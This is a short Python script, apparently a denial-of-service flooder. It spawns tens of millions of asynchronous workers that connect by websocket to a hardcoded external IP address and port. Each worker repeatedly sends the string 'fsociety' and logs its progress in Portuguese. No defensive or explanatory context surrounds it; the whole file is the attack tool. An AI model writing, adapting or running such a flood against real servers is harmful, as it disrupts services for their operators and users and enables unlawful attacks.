import asyncio, websockets

async def w(id):
    async with websockets.connect("ws://5.255.97.147:8765/script", max_queue=None) as ws:
        for i in range(2000000000):
            await ws.send("fsociety")
            print(f"[Worker {id}] Mensagem {i+1} enviada")

asyncio.run(asyncio.gather(*[w(i) for i in range(50000000)]))
